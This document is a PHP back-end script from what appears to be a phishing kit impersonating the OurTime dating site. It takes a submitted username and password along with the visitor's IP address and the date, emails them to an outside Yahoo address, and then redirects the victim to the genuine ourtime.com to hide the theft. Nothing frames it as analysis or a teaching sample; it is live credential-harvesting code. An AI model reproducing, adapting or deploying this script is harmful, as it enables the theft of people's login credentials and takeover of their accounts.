<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------  OURtme Detailz  -----\n";
$message .= "Username: ".$_POST['ope']."\n";
$message .= "Password: ".$_POST['tire']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------------------------------------\n";

$recipient = "rachel_201138@yahoo.com";
$subject = "Frosh-Ourtme";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
window.location='https://www.ourtime.com';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>